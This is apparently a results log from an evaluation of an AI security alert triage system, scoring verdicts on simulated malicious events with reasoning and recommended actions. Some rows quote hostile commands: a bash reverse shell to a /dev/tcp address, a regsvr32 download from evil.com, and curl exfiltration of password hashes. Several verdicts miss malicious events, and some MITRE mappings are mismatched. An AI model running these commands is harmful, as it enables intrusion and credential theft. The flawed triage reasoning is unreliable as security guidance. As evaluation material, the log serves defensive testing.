alert_id,event_type,true_label,predicted_verdict,confidence,correct,latency_s,reasoning,mitre_techniques,recommended_actions,investigated_tools,input_tokens,output_tokens,cache_read_tokens,cache_creation_tokens,timestamp
H-063,Registry Modification,Malicious,Suspicious,0.5,True,9.85,"Registry modification of 'Security Packages' is a known persistence mechanism. While no specific MITRE patterns were matched by the log_payload_agent and user_behavior_agent reported low risk, the nature of the modification (adding custom_ssp.dll) warrants further investigation. The SYSTEM user perf",,Investigate the purpose and origin of 'C:\Temp\custom_ssp.dll'.; Check for other suspicious activities on host 10.0.5.8.; Review SYSTEM user activity for any unauthorized actions.,log_payload_agent; user_behavior_agent,32956,463,29980,0,2026-04-18T01:45:43.642824
H-064,Database Activity,Malicious,Malicious,0.95,True,9.08,"The log_payload_agent detected 'DB-Native Code Execution' (MITRE T1059) with 0.93 confidence. This indicates an attempt to execute native code within the database, a critical security vulnerability. Both IPs are internal, confirming an internal threat.",T1059 — Command and Scripting Interpreter,Isolate the affected database server (10.0.0.18); Investigate the app_service account for compromise; Review database logs for further malicious activity,log_payload_agent,32568,524,29940,0,2026-04-18T01:45:52.725808
H-065,Cloud API Call,Malicious,Malicious,0.95,True,12.63,The log_payload_agent detected a high-confidence (0.93) match for MITRE ATT&CK T1098 - Account Manipulation (Cloud) due to the 'CreateLoginProfile' event granting 'AdministratorAccess' to 'emergency_admin'. This indicates a critical privilege escalation or account compromise.,T1098 — Account Manipulation,Immediately disable or revoke 'AdministratorAccess' from the 'emergency_admin' account.; Investigate the 'lambda-worker' account for compromise and unauthorized activity.; Review AWS CloudTrail logs for other suspicious activities related to IAM changes.,log_payload_agent; user_behavior_agent,33153,499,29092,0,2026-04-18T01:46:05.358912
H-066,System Event,Malicious,Malicious,0.95,True,9.0,"Log analysis identified a high-confidence match (0.95) for MITRE ATT&CK T1014 - Rootkit (Kernel Module) due to `finit_module` syscall on `/dev/shm/rootkit`. This indicates a kernel module load from a suspicious location, strongly suggesting rootkit installation. User behavior analysis showed no spec",T1014 — Rootkit,Isolate host with IP 10.0.5.87 immediately; Perform forensic analysis on host 10.0.5.87 to identify the rootkit and its capabilities; Block execution of files from /dev/shm/ on all endpoints,log_payload_agent; user_behavior_agent,33060,534,29994,0,2026-04-18T01:46:12.837304
H-067,Network Activity,Malicious,Malicious,0.95,True,10.03,"Log analysis identified a high-confidence match (0.93) for ICMP tunneling (T1095), indicating potential covert channel communication. The destination IP is in China, a high-risk country. The large number of ICMP packets with significant payload sizes (111 packets >500 bytes in 247s) further supports",T1095 — Non-Application Layer Protocol,Block destination IP 180.173.73.18 at the firewall.; Isolate source host 10.0.5.187.; Investigate source host 10.0.5.187 for compromise and presence of ICMP tunneling tools.,log_payload_agent; network_intel_agent,33300,585,30023,0,2026-04-18T01:46:22.864101
H-068,Process Execution,Malicious,Malicious,0.95,True,9.39,"Log analysis shows `cscript.exe` executing `wscript.exe` to run a VBScript from `ProgramData`, a common persistence and execution technique. This matches MITRE T1059 and T1059.005 with high confidence. User behavior analysis shows no anomalies, which is not uncommon for targeted attacks or compromis",T1059 — Command and Scripting Interpreter; T1059.005 — Visual Basic,Isolate host 10.0.1.38; Investigate C:\ProgramData\update.vbs; Reset credentials for user1,log_payload_agent; user_behavior_agent,33019,486,29994,0,2026-04-18T01:46:32.252445
H-069,Registry Modification,Malicious,Malicious,0.95,True,9.69,"Log analysis identified a high-confidence (0.95) match for OS Credential Dumping (T1003) via registry modification to SilentProcessExit for lsass.exe. This is a known technique for credential theft. User behavior analysis showed no anomalies for the SYSTEM user, which is expected for this type of at",T1003 — OS Credential Dumping,Isolate host 10.0.2.186; Investigate C:\Temp\monitor.exe on host 10.0.2.186; Perform memory forensics on host 10.0.2.186 to identify dumped credentials,log_payload_agent; user_behavior_agent,33089,507,29996,0,2026-04-18T01:46:40.403883
H-070,Cloud API Call,Malicious,Malicious,0.95,True,14.97,The log_payload_agent detected a high-confidence (0.93) match for T1098 - Account Manipulation (Cloud) due to an 'AttachUserPolicy' event granting 'AdministratorAccess' to 'dev_user' by 'lambda-worker'. This indicates a privilege escalation attempt.,T1098 — Account Manipulation (Cloud),Revoke 'AdministratorAccess' from 'dev_user'; Investigate 'lambda-worker' for compromise; Review IAM policies and CloudTrail logs for similar suspicious activity,log_payload_agent; user_behavior_agent,33249,523,27264,0,2026-04-18T01:46:55.369555
H-071,Database Activity,Malicious,Malicious,0.95,True,9.29,The log_payload_agent detected a high-confidence (0.93) 'DB-Native Code Execution' pattern (T1059) due to 'ALTER USER app_readonly SUPERUSER' command. This indicates a privilege escalation attempt.,T1059 — Command and Scripting Interpreter,Revoke SUPERUSER privilege from 'app_readonly'; Investigate 'analytics_user' for compromise; Implement stricter access controls on database users,log_payload_agent; user_behavior_agent,32643,489,29045,0,2026-04-18T01:47:04.663380
H-072,Cloud API Call,Malicious,Malicious,0.95,True,7.93,The log_payload_agent detected a high-confidence (0.93) MITRE ATT&CK pattern T1098 (Account Manipulation (Cloud)) due to 'dev_user' creating 'backdoor_user' with 'AdministratorAccess'. This is a critical privilege escalation event.,T1098 — Account Manipulation (Cloud),Suspend 'dev_user' account; Delete 'backdoor_user' account; Revoke 'AdministratorAccess' from any newly created users,log_payload_agent; user_behavior_agent,32909,424,7328,0,2026-04-18T01:47:11.060175
H-073,Process Execution,Malicious,Malicious,0.95,True,8.96,"The log_payload_agent detected a high-confidence (0.8) script execution pattern (T1059.005) involving regsvr32.exe and wscript.exe executing a VBScript from ProgramData, which is a common persistence and execution technique. The user behavior agent found no anomalies, which is expected as the execut",T1059.005 — Visual Basic,Isolate host with IP 10.0.3.128; Investigate C:\ProgramData\update.vbs; Perform endpoint forensics on the affected host,log_payload_agent; user_behavior_agent,33058,501,21761,0,2026-04-18T01:47:20.016566
H-074,Database Activity,Malicious,Malicious,0.95,True,7.74,"The log_payload_agent detected a high-confidence (0.93) MITRE ATT&CK pattern (T1059 - DB-Native Code Execution) for the 'ALTER USER app_readonly SUPERUSER;' statement, indicating privilege escalation. This overrides the low risk score from the user_behavior_agent.",T1059 — DB-Native Code Execution,Isolate the affected database instance.; Revoke SUPERUSER privileges from app_readonly.; Reset credentials for analytics_user.,log_payload_agent; user_behavior_agent,24249,454,21847,0,2026-04-18T01:47:27.759430
H-075,File System Activity,Malicious,Benign,0.75,False,10.06,"No malicious indicators or MITRE ATT&CK patterns were identified by the log_payload_agent. The user_behavior_agent reported low risk with no significant anomalies beyond routine admin activity. The file creation by certutil.exe in a shared IME directory, while unusual, does not present as malicious ",,No action required. Monitor for future suspicious activity.,log_payload_agent; user_behavior_agent,32857,478,29970,0,2026-04-18T01:47:37.822653
H-076,Database Activity,Malicious,Suspicious,0.65,True,19.38,"The log entry shows an attempt to copy data from pg_shadow (likely containing password hashes) to an internal IP address using curl. While the destination IP is private and no external threat intel was found, this activity is highly suspicious as it involves sensitive data exfiltration within the ne",,Investigate host 10.0.3.110 for compromise.; Review logs on 10.0.99.5 for incoming connections on port 8080.; Reset credentials for analytics_user.,log_payload_agent; network_intel_agent,33011,479,22718,0,2026-04-18T01:47:55.677822
H-077,Network Activity,Malicious,Benign,0.9,False,10.16,"Network intelligence found no malicious indicators for the external IP. Log/payload analysis found no attack patterns or IOCs. ICMP Echo Reply traffic, even with a large payload and volume, is not inherently malicious without further context.",,No action required,network_intel_agent; log_payload_agent,33038,436,7329,0,2026-04-18T01:48:05.837689
H-078,File System Activity,Malicious,Benign,0.75,False,8.97,"The log_payload_agent found no matching attack patterns, benign indicators, IOCs, or CVEs. The user_behavior_agent also reported a low risk score for the SYSTEM user's file creation activity, with no anomalous flags or compound risks. The file path C:\Windows\System32\Tasks\Microsoft\Windows\Mainten",,No action required,log_payload_agent; user_behavior_agent,33033,517,29989,0,2026-04-18T01:48:13.268073
H-079,Network Activity,Malicious,Suspicious,0.65,True,17.79,"Network activity shows unusual ICMP traffic with large payloads (>500 bytes) to an external IP, which could indicate covert channel communication or data exfiltration. While the destination IP has no known malicious reputation and the volume is not exceptionally high, the payload size is a significa",,Block destination IP 176.141.22.28 at the firewall.; Investigate host 10.0.0.155 for malware or compromised processes.; Implement deep packet inspection for ICMP traffic to detect covert channels.,network_intel_agent; log_payload_agent,33330,555,30058,0,2026-04-18T01:48:31.060224
H-080,Database Activity,Malicious,Malicious,0.95,True,9.7,"The log_payload_agent detected a high-confidence match (0.93) for 'DB-Native Code Execution' (T1059) due to 'ALTER USER app_readonly SUPERUSER;'. This indicates a critical privilege escalation attempt. While user_behavior_agent flagged admin activity, the explicit malicious pattern from log analysis",T1059 — Command and Scripting Interpreter,Isolate the host with IP 10.0.2.61; Reset credentials for 'analytics_user'; Revoke SUPERUSER privileges from 'app_readonly',log_payload_agent; user_behavior_agent,32610,379,29045,0,2026-04-18T01:48:40.758501
H-081,Web Request,Malicious,Malicious,0.95,True,35.92,"Log analysis confirmed a Server-Side Request Forgery (SSRF) attempt (T1190) with high confidence. An internal IP (10.0.3.128) was targeted, indicating an attempt to access internal resources via the vulnerable webhook.",T1190 — Exploit Public-Facing Application,Block access to 10.0.3.128:8080/admin from the affected server.; Investigate the webhook application for SSRF vulnerability and patch immediately.; Review logs for further exploitation attempts from 192.168.1.67 and 192.168.1.68.,log_payload_agent; user_behavior_agent,50994,670,36337,0,2026-04-18T01:49:13.604958
H-082,Web Request,Malicious,Malicious,0.95,True,23.62,"Log analysis identified a high-confidence (0.92) SSRF attempt (T1190) targeting an internal admin URL. While network intel showed only private IPs and user behavior was low risk, the explicit attack pattern match from log_payload_agent takes precedence.",T1190 — Exploit Public-Facing Application,Investigate host 10.0.1.145 for compromise.; Block access to 10.0.5.155:8080/admin from untrusted sources.; Review web application logs for further SSRF attempts.,log_payload_agent; network_intel_agent; user_behavior_agent,51385,751,46213,0,2026-04-18T01:49:37.226405
H-083,Process Execution,Malicious,Malicious,0.95,True,9.52,"The log_payload_agent detected a high-confidence match (0.8) for script execution (T1059.005) involving wscript.exe and cscript.exe, which is commonly used for malicious script execution. While user_behavior_agent reported low risk for the SYSTEM user, the explicit malicious pattern from log analysi",T1059.005 — Visual Basic,Isolate the affected host (10.0.5.179); Investigate the content of C:\Users\Public\temp.txt; Perform a full forensic analysis of the host to identify the source of the script and any further compromise.,log_payload_agent; user_behavior_agent,33095,531,29998,0,2026-04-18T01:49:45.227926
H-084,Cloud API Call,Malicious,Malicious,0.95,True,11.72,"The log_payload_agent detected a high-confidence (0.93) match for MITRE ATT&CK T1098 - Account Manipulation (Cloud), specifically 'CreateLoginProfile' for 'emergency_admin' with 'AdministratorAccess' by 'ci-bot'. This indicates a critical security event where a new administrative account was created",T1098 — Account Manipulation,Immediately investigate the 'ci-bot' account for compromise.; Review all recent activities of 'ci-bot' and 'emergency_admin' accounts.; Disable or remove the 'emergency_admin' account if unauthorized.,log_payload_agent; user_behavior_agent,33193,542,14510,0,2026-04-18T01:49:56.950363
H-085,Database Activity,Malicious,Malicious,0.95,True,14.71,Attempted exfiltration of pg_shadow (password hashes) via curl to an internal IP. This is a clear data exfiltration attempt.,T1003.001 - OS Credential Dumping: /etc/passwd and /etc/shadow; T1041 - Exfiltration Over C2 Channel,Isolate host 10.0.1.208; Block all traffic to 10.0.99.5:8080; Reset credentials for 'app_service',log_payload_agent; network_intel_agent,32989,626,29968,0,2026-04-18T01:50:11.658624
H-086,Database Activity,Malicious,Malicious,0.95,True,9.71,"The log entry shows an attempt to load an external library ('$libdir/pg_exec') into the database, which is a strong indicator of DB-Native Code Execution (MITRE T1059). This is a critical security risk, regardless of the user behavior score.",T1059 — Command and Scripting Interpreter,Isolate the affected database server immediately.; Review database logs for further malicious activity.; Reset credentials for 'analytics_user'.,log_payload_agent; user_behavior_agent,32753,527,22632,0,2026-04-18T01:50:19.822827
H-087,Cloud API Call,Malicious,Malicious,0.95,True,8.71,"The log_payload_agent detected a high-confidence (0.93) match for MITRE ATT&CK T1098 - Account Manipulation (Cloud), specifically the creation of a 'backdoor_user' with 'AdministratorAccess'. This is a critical risk indicator.",T1098 — Account Manipulation,Immediately disable 'backdoor_user'; Investigate 'dev_user' for compromise; Review CloudTrail logs for other suspicious activities by 'dev_user',log_payload_agent; user_behavior_agent,32978,426,29078,0,2026-04-18T01:50:28.530561
H-088,Process Execution,Malicious,Malicious,0.95,True,12.61,"The log_payload_agent detected a high-confidence match (0.8) for T1059.005 - Visual Basic, indicating script execution via cscript.exe. This is a known technique for executing malicious scripts. The use of regsvr32.exe to launch cscript.exe from a user's Public directory is highly suspicious and ind",T1059.005 — Visual Basic,Isolate host 10.0.2.26; Investigate C:\Users\Public\temp.txt for malicious script content; Perform forensic analysis on host 10.0.2.26 to identify persistence mechanisms and further compromise,log_payload_agent; user_behavior_agent,33086,525,29998,0,2026-04-18T01:50:41.143435
H-089,Web Request,Malicious,Malicious,0.92,True,21.7,"Log analysis identified a Server-Side Request Forgery (SSRF) attempt (T1190) with a high confidence score of 0.92. The request attempts to access an internal admin URL. Network analysis shows all IPs are internal, but this does not negate the SSRF attempt.",T1190 — Exploit Public-Facing Application,Investigate the source of the web request (10.0.3.238) for compromise.; Block access to the internal admin URL (10.0.1.223:8080/admin) from external sources.; Review web application logs for similar SSRF attempts.,log_payload_agent; network_intel_agent,50367,582,46225,0,2026-04-18T01:51:01.318609
H-090,System Event,Malicious,Malicious,0.95,True,14.14,Log analysis shows a high-confidence match (0.95) to MITRE T1014 - Rootkit (Kernel Module) due to 'finit_module' syscall and 'insmod' of '/dev/shm/rootkit'. This indicates a kernel-level compromise.,T1014 — Rootkit,Isolate host 10.0.3.10 immediately; Perform forensic analysis on host 10.0.3.10 to identify the root cause and extent of compromise; Review system logs for further indicators of compromise,log_payload_agent,50375,763,46050,0,2026-04-18T01:51:15.454964
H-091,Cloud API Call,Malicious,Malicious,0.95,True,9.79,"The log payload clearly shows an attempt to attach 'AdministratorAccess' policy to 'dev_user', which is a privilege escalation attempt (T1098).",T1098 — Account Manipulation,Revoke 'AdministratorAccess' from 'dev_user'; Investigate 'dev_user' for compromise; Implement AWS IAM least privilege best practices,log_payload_agent; user_behavior_agent,33071,533,29978,0,2026-04-18T01:51:23.707333
H-092,Process Execution,Malicious,Malicious,0.95,True,17.18,"The log_payload_agent identified multiple high-confidence MITRE ATT&CK patterns (T1059, T1059.005, T1105) related to command execution, script execution, and ingress tool transfer. The network_intel_agent confirmed 'evil.com' as a known malicious domain with a high AlienVault OTX pulse count. The us",T1059 — Command and Scripting Interpreter; T1059.005 — Visual Basic; T1105 — Ingress Tool Transfer,Block 'evil.com' at the firewall and proxy.; Isolate the affected host (10.0.5.189).; Perform a full forensic analysis on the compromised host.,log_payload_agent; network_intel_agent; user_behavior_agent,51062,694,37231,0,2026-04-18T01:51:40.885530
H-093,System Event,Malicious,Malicious,0.95,True,17.73,"The log entry shows a 'finit_module' syscall by 'modprobe' from '/tmp/loader', which is a strong indicator of a kernel module being loaded from a suspicious location, consistent with rootkit activity (T1014). The log_payload_agent scored this with 0.95 confidence. User behavior analysis did not prov",T1014 — Rootkit,Isolate host 192.168.1.116 immediately; Perform forensic analysis on host 192.168.1.116 to identify the source and nature of the kernel module; Block execution of /tmp/loader across all endpoints,log_payload_agent; user_behavior_agent,49971,654,45279,0,2026-04-18T01:51:57.070619
H-094,Registry Modification,Malicious,Benign,0.75,False,11.24,Both log/payload analysis and user behavior analysis returned low risk scores with no matched attack patterns or anomalies. The registry modification by SYSTEM user appears to be a routine system operation.,,No action required,log_payload_agent; user_behavior_agent,32983,404,22728,0,2026-04-18T01:52:08.313068
H-095,Network Activity,Malicious,Malicious,0.95,True,10.18,The log_payload_agent detected a high-confidence match (0.93) for MITRE technique T1095 (ICMP Tunnel) due to 85 ICMP packets with large payloads (>500 bytes) in a short duration (64s). This indicates potential data exfiltration or covert channel communication. While the network_intel_agent found no ,T1095 — Non-Application Layer Protocol,Isolate host 10.0.3.51; Block outbound ICMP traffic from internal networks to 210.226.225.214; Investigate host 10.0.3.51 for malware or compromised processes,log_payload_agent; network_intel_agent,33211,576,22743,0,2026-04-18T01:52:16.941295
H-096,Process Execution,Malicious,Malicious,0.95,True,9.57,The log_payload_agent identified high-confidence matches for MITRE ATT&CK techniques T1059 (Command and Scripting Interpreter) and T1059.005 (Visual Basic) with a risk score of High. The execution of a VBScript from ProgramData via cscript.exe and wscript.exe is a common method for malware execution,T1059 — Command and Scripting Interpreter; T1059.005 — Visual Basic,Isolate host 192.168.1.124; Investigate C:\ProgramData\update.vbs for malicious content; Perform endpoint forensics on host 192.168.1.124,log_payload_agent; user_behavior_agent,33091,546,29998,0,2026-04-18T01:52:26.512898
H-097,File System Activity,Malicious,Benign,0.75,False,9.02,"Neither log_payload_agent nor user_behavior_agent found any malicious indicators or high-risk anomalies. The file creation by SYSTEM via certutil.exe, while unusual, did not trigger any known attack patterns or user behavior flags. This could be a legitimate system process or a benign administrative",,Monitor for similar events in the future.; Investigate the purpose of debug.exe and its creation by certutil.exe if this pattern recurs.,log_payload_agent; user_behavior_agent,32857,409,29971,0,2026-04-18T01:52:35.533892
H-098,System Event,Malicious,Malicious,0.95,True,11.95,"Log analysis shows a high-confidence match (0.95) for MITRE T1014 (Rootkit, Kernel Module) due to 'init_module' syscall and 'exe=""/dev/shm/rootkit""'. This indicates a kernel module being loaded from a suspicious location, strongly suggesting rootkit installation.",T1014 — Rootkit,Isolate host with IP 192.168.1.34 immediately; Perform forensic analysis on host 192.168.1.34 to identify the rootkit and its origin; Review system logs on 192.168.1.34 for precursor activities and lateral movement,log_payload_agent,41368,614,22601,0,2026-04-18T01:52:47.481020
H-099,Database Activity,Malicious,Malicious,0.95,True,10.64,"The log entry 'LOAD '$libdir/pg_exec';' indicates an attempt to execute native code within the database, which is a strong indicator of compromise and matches the MITRE ATT&CK technique T1059 (DB-Native Code Execution). This is a critical security event.",T1059 — DB-Native Code Execution,Isolate destination IP 10.0.3.129 immediately.; Investigate the migration_svc account for compromise.; Perform a forensic analysis on the database server at 10.0.3.129 to identify the source of the pg_exec module and any further malicious activity.,log_payload_agent,41090,569,38066,0,2026-04-18T01:52:56.596425
H-100,Network Activity,Malicious,Malicious,0.95,True,18.73,"High volume ICMP traffic with large payloads (156 packets, >500 bytes each) matching the ICMP tunneling pattern (T1095) indicates potential data exfiltration, despite no external threat intel on the destination IP.",T1095 — Non-Application Layer Protocol,Block destination IP 95.117.246.93 at firewall; Isolate source host 10.0.3.126; Investigate source host 10.0.3.126 for compromise,network_intel_agent; log_payload_agent,50434,685,46275,0,2026-04-18T01:53:15.325513
H-101,File System Activity,Malicious,Malicious,0.95,True,8.83,"SYSMON EventID=11 (FileCreate) indicates a DLL file was created in a non-standard directory (System32\spool\drivers\color) by cmd.exe under the SYSTEM user. This is a strong indicator of persistence (T1059) and potential kernel rootkit installation, even though user behavior agent reported low risk ",T1059 — Command and Scripting Interpreter,Isolate host 10.0.5.31; Perform forensic analysis on host 10.0.5.31 to identify the source of the DLL and any further compromise; Remove payload.dll from C:\Windows\System32\spool\drivers\color,log_payload_agent; user_behavior_agent,32962,516,29985,0,2026-04-18T01:53:22.628685
H-102,Network Activity,Malicious,Malicious,0.95,True,13.45,"Log analysis detected a high-confidence ICMP tunnel (0.93) with large payloads (1067 bytes) and high volume (146 packets in 91s), indicating potential data exfiltration or covert communication. The external IP 51.181.211.4 is associated with a VPN/proxy, further raising suspicion.",T1095 — Non-Application Layer Protocol,Block IP 51.181.211.4 at the firewall; Isolate host 10.0.2.198; Investigate host 10.0.2.198 for malware or compromised credentials,network_intel_agent; log_payload_agent,33527,580,30091,0,2026-04-18T01:53:36.081138
H-103,Registry Modification,Malicious,Suspicious,0.45,True,11.11,"Registry modification to add a custom SSP DLL (T1547.005) is a known persistence technique. However, automated tools did not flag it as malicious due to lack of other indicators. Further investigation is needed.",T1547.005 — Boot or Logon Autostart Execution: Security Support Provider,Investigate the origin and purpose of C:\Temp\custom_ssp.dll; Scan the host for malware; Monitor the SYSTEM user for further suspicious activity,log_payload_agent; user_behavior_agent,33034,602,29995,0,2026-04-18T01:53:47.194636
H-104,Cloud API Call,Malicious,Malicious,0.95,True,10.39,"The log payload agent detected a high-confidence (0.93) match for MITRE ATT&CK T1098 - Account Manipulation (Cloud), specifically the creation of an access key for 'backdoor_user' with AdministratorAccess by 'temp_contractor'. This indicates a potential compromise and privilege escalation.",T1098 — Account Manipulation,Immediately disable access keys for 'backdoor_user'; Revoke 'AdministratorAccess' from 'backdoor_user'; Investigate 'temp_contractor' account for compromise,log_payload_agent; user_behavior_agent,33093,505,29975,0,2026-04-18T01:53:56.034723
H-105,Registry Modification,Malicious,Malicious,0.95,True,14.76,Registry modification to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages to include a custom DLL (custom_ssp.dll) is a known technique for persistence and credential theft (SSP/LSA impersonation).,T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder; T1003.001 — OS Credential Dumping: LSASS Memory,Isolate host 10.0.0.66; Investigate C:\Temp\custom_ssp.dll for malicious code; Perform memory forensics on host 10.0.0.66 to identify injected processes or credential dumping activity,log_payload_agent; user_behavior_agent,49762,713,46152,0,2026-04-18T01:54:10.791398
H-106,Web Request,Malicious,Malicious,0.95,True,10.16,The log_payload_agent detected a high-confidence (0.92) SSRF attack (T1190) with an internal IP as an IOC. This indicates an attempt to exploit a public-facing application to access internal resources.,T1190 — Exploit Public-Facing Application,Block access to 10.0.0.37:8080; Investigate the application at 10.0.1.19 for vulnerabilities; Review logs for further exploitation attempts,log_payload_agent; user_behavior_agent,33543,645,29138,0,2026-04-18T01:54:19.421715
H-107,Database Activity,Malicious,Malicious,0.95,True,8.56,"The log_payload_agent detected a high-confidence (0.93) match for 'DB-Native Code Execution' (T1059) due to 'ALTER USER app_readonly SUPERUSER'. This indicates a privilege escalation attempt on a database user. While user_behavior_agent flagged 'app_service' as an admin account, the nature of the 'A",T1059 - Command and Scripting Interpreter,Isolate host 10.0.5.114; Revoke SUPERUSER privilege from app_readonly; Reset credentials for app_service,log_payload_agent; user_behavior_agent,32733,438,22680,0,2026-04-18T01:54:27.978136
H-108,Process Execution,Malicious,Malicious,0.95,True,10.11,"Log analysis shows high-confidence MITRE ATT&CK matches for Ingress Tool Transfer (T1105) and Command and Scripting Interpreter (T1059), specifically Visual Basic (T1059.005), with a critical risk score. The command line indicates an attempt to download and execute a script from a malicious URL (evi",T1105 — Ingress Tool Transfer; T1059.005 — Visual Basic; T1059 — Command and Scripting Interpreter,Isolate host 10.0.0.46 and 10.0.3.223; Block http://evil.com/file.sct and evil.com at the firewall/proxy; Reset credentials for user 'admin',log_payload_agent; user_behavior_agent,33300,622,22737,0,2026-04-18T01:54:38.087379
H-109,Process Execution,Malicious,Malicious,0.95,True,9.44,"The log payload clearly indicates the use of regsvr32.exe to download and execute a script from a malicious domain (evil.com), which is a known LOLBIN technique for ingress tool transfer and script execution. This is a high-confidence match for MITRE ATT&CK techniques T1105 and T1059.005. The user b",T1105 — Ingress Tool Transfer; T1059.005 — Visual Basic,Block http://evil.com/file.sct and evil.com at the firewall and proxy.; Isolate the host 10.0.1.59.; Investigate the 'admin' user account for compromise.,log_payload_agent; user_behavior_agent,33104,513,29094,0,2026-04-18T01:54:47.531823
H-110,Database Activity,Malicious,Malicious,0.93,True,8.9,"The log_payload_agent detected a high-confidence (0.93) match for 'DB-Native Code Execution' (MITRE T1059) due to 'ALTER USER app_readonly SUPERUSER'. This indicates a privilege escalation attempt on a database user. While user_behavior_agent flagged admin activity, the explicit malicious pattern fr",T1059 — Command and Scripting Interpreter,Immediately revoke SUPERUSER privileges from 'app_readonly' and 'analytics_user'.; Investigate 'analytics_user' for compromise.; Review database audit logs for other unauthorized changes.,log_payload_agent; user_behavior_agent,32674,384,29956,0,2026-04-18T01:54:54.891389
H-111,Database Activity,Malicious,Malicious,0.95,True,16.57,"The log clearly shows the creation of a 'backdoor' function with a reverse shell payload (bash -i >& /dev/tcp/10.0.99.5/4444 0>&1). This is a direct indication of malicious activity, despite the low-risk scores from automated tools. The 'app_service' account was used to execute this, indicating pote",T1068 - Exploitation for Privilege Escalation; T1071.001 - Application Layer Protocol: Web Protocols,Isolate the affected database server (10.0.1.35); Reset credentials for 'app_service'; Block outbound connections to 10.0.99.5 at the firewall,log_payload_agent; user_behavior_agent,50410,922,45313,0,2026-04-18T01:55:11.459360
H-112,Database Activity,Malicious,Malicious,0.95,True,8.99,The log clearly shows the creation of a PostgreSQL function named 'backdoor' that executes a reverse shell to 10.0.99.5. This is a direct indicator of compromise and an attempt to establish persistence and remote access.,T1059.006 — Command and Scripting Interpreter: Python; T1078 — Valid Accounts; T1505.003 — Server Software Component: Web Shell; T1021.001 — Remote Services: Remote Desktop Protocol,Isolate the affected database server immediately.; Block IP 10.0.99.5 at the firewall.; Investigate the 'migration_svc' account for compromise and reset its credentials.,log_payload_agent; user_behavior_agent,33043,542,29079,0,2026-04-18T01:55:20.450662
H-113,Cloud API Call,Malicious,Suspicious,0.45,True,9.25,"The 'UpdateAssumeRolePolicy' event for 'backdoor_user' with 'AdministratorAccess' by 'temp_contractor' is suspicious. While no specific MITRE patterns or high-risk user behaviors were flagged by the tools, the nature of the event (modifying administrative policy for a user named 'backdoor_user') war",,Investigate the purpose of 'backdoor_user' and its creation.; Review all activities of 'temp_contractor' for the past 24-48 hours.; Verify if the 'UpdateAssumeRolePolicy' action was authorized and expected.,log_payload_agent; user_behavior_agent,33108,552,29984,0,2026-04-18T01:55:28.177386
H-114,File System Activity,Malicious,Suspicious,0.45,True,14.04,"The creation of an executable in a system task directory by certutil.exe is suspicious, even though no specific MITRE patterns were matched and user behavior risk is low. This could indicate an attempt at persistence.",,Investigate the purpose of 'update.exe' and its origin.; Review 'admin' user activity around the time of the event for further suspicious actions.; Scan the host for malware.,log_payload_agent; user_behavior_agent,49713,463,37972,0,2026-04-18T01:55:42.220173
H-115,Web Request,Malicious,Malicious,0.95,True,12.1,"Log analysis shows a high-confidence match (0.92) for MITRE T1190 (Exploit Public-Facing Application - SSRF). The POST request to /api/v1/callback with a body containing an internal IP (10.0.5.190) in the 'url' field strongly indicates an SSRF attempt, aiming to access internal resources via the web",T1190 — Exploit Public-Facing Application,Block source IP 10.0.3.200 at the firewall.; Investigate host 10.0.3.200 for compromise.; Review web application logs for successful SSRF exploitation attempts against 10.0.5.190:8080/admin.,log_payload_agent,41677,630,14529,0,2026-04-18T01:55:52.780499
H-116,Web Request,Malicious,Malicious,0.95,True,10.25,Log analysis indicates a high-confidence (0.92) match for MITRE T1190 (Exploit Public-Facing Application - SSRF) with IOC 10.0.0.181. This suggests an attempt to exploit a server-side request forgery vulnerability.,T1190 — Exploit Public-Facing Application,Block IP 10.0.0.181 at the firewall; Investigate the web application for SSRF vulnerabilities; Review logs for further exploitation attempts from 10.0.0.181,log_payload_agent; user_behavior_agent,33133,586,7224,0,2026-04-18T01:56:03.028769
H-117,Network Activity,Malicious,Malicious,0.95,True,10.07,"The log payload agent detected a high-confidence match for MITRE T1095 (ICMP Tunnel) due to 56 ICMP packets with >500 byte payloads in 113 seconds. This indicates potential data exfiltration or covert communication, despite the network intel agent not flagging the destination IP as highly malicious.",T1095 — Non-Application Layer Protocol,"Block destination IP 46.99.188.194 at the firewall.; Isolate source IP 10.0.3.196.; Perform a forensic analysis on the host at 10.0.3.196 to identify the process generating the ICMP traffic and determine what data, if any, was exfiltrated.",network_intel_agent; log_payload_agent,24781,671,14607,0,2026-04-18T01:56:13.098388
